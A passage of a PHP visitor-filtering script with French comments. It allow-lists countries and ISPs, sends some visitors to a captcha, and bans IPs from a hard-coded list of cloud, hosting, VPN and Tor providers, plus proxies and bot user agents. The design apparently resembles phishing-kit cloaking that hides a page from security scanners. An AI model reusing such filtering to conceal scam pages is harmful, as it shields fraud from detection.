        logBlockedVisit($ip, $country, $isp, "Pays autorisé mais pas de liste ISP (redirigé vers captcha): $country", $paths['banLog']);
        // Vérifier si on n'est pas déjà sur la page captcha pour éviter la boucle
        $currentScript = basename($_SERVER['SCRIPT_NAME']);
        if ($currentScript !== 'captcha.php') {
            header('Location: ../captcha.php');
            exit;
        }
    } else {
        logBlockedVisit($ip, $country, $isp, "Pays autorisé mais pas de liste ISP + Proxy/VPN/Bot: $country", $paths['banLog']);
        file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
        setSessionCache($ip, false);
        exitWithBan($redirectURL);
    }
}

// VÉRIFICATION : ISP non valide
if (!$ispValid) {
    // Si utilisateur légitime (pas proxy/vpn/bot) -> CAPTCHA
    if ($isLegitimateUser) {
        logBlockedVisit($ip, $country, $isp, "ISP non autorisé (redirigé vers captcha) pour $country: $isp", $paths['banLog']);
        // Vérifier si on n'est pas déjà sur la page captcha pour éviter la boucle
        $currentScript = basename($_SERVER['SCRIPT_NAME']);
        if ($currentScript !== 'captcha.php') {
            header('Location: ../captcha.php');
            exit;
        }
    } else {
        // Si proxy/vpn/bot détecté -> BANNIR DIRECTEMENT
        logBlockedVisit($ip, $country, $isp, "ISP non autorisé + Proxy/VPN/Bot pour $country: $isp", $paths['banLog']);
        file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
        setSessionCache($ip, false);
        exitWithBan($redirectURL);
    }
}

/* -------------------------------------------------------------------------- */
/*  Blocage Cloud/Proxy/Hosting - VÉRIFICATION STRICTE                       */
/* -------------------------------------------------------------------------- */
$cloudISPs = [ 'GOOGLE', 'GOOGLE LLC', 'AMAZON', 'AMAZON.COM', 'AMAZON TECHNOLOGIES', 'MICROSOFT', 'MICROSOFT CORPORATION', 'AZURE', 'DIGITALOCEAN', 'HETZNER', 'OVH', 'CLOUDFLARE', 'LINODE', 'LEASEWEB', 'CONTABO', 'SCALeway', 'ORACLE', 'VULTR', 'FASTLY', 'G-CORE', 'M247', 'CHOOPA', 'ALIBABA', 'TENCENT', 'NETCUP', 'COLOCROSSING', 'QUADRANET', 'HOSTINGER', 'NFORCE', 'EONIX', 'IBM', 'IONOS', 'ZARE', 'UHOST', 'LLHOST', 'SOFTLAYER', 'VPSFAST', 'FLY.IO', 'ZOMRO', 'TIME4VPS', 'BUYVM', 'VPN', 'TOR', 'MULLVAD', 'PROTON', 'NORDVPN', 'CYBERGHOST', 'TUNNELBEAR', 'SAFERVPN', 'PRIVATE INTERNET ACCESS', 'WIREGUARD', 'SOCKS5', 'OPENVPN', 'BROWSEC' ];

// VÉRIFICATION STRICTE : Bloquer les ISPs cloud même si autorisés
foreach ($cloudISPs as $blocked) {
    if (stripos($isp, $blocked) !== false || stripos($asname, $blocked) !== false) {
        logBlockedVisit($ip, $country, $isp, "ISP/AS cloud bloqué ($blocked)", $paths['banLog']);
        file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
        setSessionCache($ip, false);
        exitWithBan($redirectURL);
    }
}

/* -------------------------------------------------------------------------- */
/*  VÉRIFICATIONS FINALES - MODE RESTRICTIF                                  */
/* -------------------------------------------------------------------------- */

// Si nous arrivons ici, le pays et l'ISP sont déjà validés
// Vérifications finales pour Proxy/Hosting/Bot

// 1. Vérification finale : Proxy/Hosting = BLOQUÉ immédiatement
if ($isProxy || $isHosting) {
    logBlockedVisit($ip, $country, $isp, "Proxy/Hosting détecté", $paths['banLog']);
    file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
    setSessionCache($ip, false);
    exitWithBan($redirectURL);
}

// 2. Vérification finale : Bot user-agent = BLOQUÉ immédiatement
if ($isBot) {
    logBlockedVisit($ip, $country, $isp, "Bot User-Agent détecté", $paths['banLog']);
    file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
    setSessionCache($ip, false);
    exitWithBan($redirectURL);
}

// 3. Si toutes les vérifications passent -> AUTORISER
$authorized = true;
$reason = "Accès autorisé - Pays: $country, ISP: $isp";

/* -------------------------------------------------------------------------- */
/*  Log de visite                                                             */
/* -------------------------------------------------------------------------- */
$visitEntry = [
    'ip'         => $ip,
    'country'    => $country,
    'isp'        => $isp,
    'asname'     => $asname,
    'device'     => $device,
    'authorized' => $authorized,
    'reason'     => $authorized ? 'Authorized' : implode(', ', array_filter([
        $countryValid ? '' : "Pays non autoriser ($country)",
        $ispValid ? '' : "ISP non autoriser ($isp)",
        $isProxy ? "Proxy détecter" : '',
        $isHosting ? "Hébergeur detect" : '',
        $isBot ? "Bot UA détecter" : '',
    ])),
    'date' => date('Y-m-d H:i:s'),
];

$allVisits   = file_exists($paths['visitLog']) ? (json_decode(file_get_contents($paths['visitLog']), true) ?: []) : [];
$allVisits[] = $visitEntry;
file_put_contents($paths['visitLog'], json_encode($allVisits, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);

/* -------------------------------------------------------------------------- */
/*  Blocage final et mise en cache de session                                */
/* -------------------------------------------------------------------------- */
if (!$authorized) {
    // Stocker la raison du bannissement en session pour la page ban
    $_SESSION['ban_reason'] = $visitEntry['reason'];
    $_SESSION['visitor'] = $visitEntry; // Stocker toutes les infos du visiteur
    
    logBlockedVisit($ip, $country, $isp, $visitEntry['reason'], $paths['banLog']);
    file_put_contents($paths['bannedIPs'], $ip . PHP_EOL, FILE_APPEND | LOCK_EX);
    
    // Mettre à jour le compteur de robots bannis
    require_once __DIR__ . '/../func/update_banned_counters.php';
    updateBannedRobotsCounter($ip, $visitEntry['reason']);
    
    setSessionCache($ip, false); // Cache le résultat négatif
    exitWithBan($redirectURL);
} else {
    // Cache le résultat positif pour éviter les vérifications répétées
    setSessionCache($ip, true);
    
    // ✅ OPTIMISATION: Sauvegarder l'IP autorisée dans le cache persistant
    $authorizedIPs[$ip] = [
        'timestamp' => time(),
        'country' => $country,
        'isp' => $isp,
        'device' => $device
    ];
    
    // Nettoyer les anciennes entrées (plus de 7 jours)
    $cutoff = time() - (7 * 86400); // 7 jours
    foreach ($authorizedIPs as $cachedIP => $data) {
        if ($data['timestamp'] < $cutoff) {
            unset($authorizedIPs[$cachedIP]);
        }
    }
    
    // Sauvegarder le cache mis à jour
    file_put_contents($authorizedIPsCache, json_encode($authorizedIPs, JSON_PRETTY_PRINT), LOCK_EX);
}
?>
